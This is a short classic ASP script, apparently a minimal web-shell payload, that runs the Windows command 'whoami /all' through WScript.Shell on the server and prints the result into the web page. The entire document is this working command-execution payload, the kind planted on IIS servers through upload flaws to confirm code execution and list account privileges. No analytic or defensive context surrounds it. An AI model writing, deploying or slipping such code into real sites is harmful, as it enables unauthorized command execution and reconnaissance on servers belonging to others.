<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("whoami /all")
o = cmd.StdOut.Readall()
Response.write(o)
%>
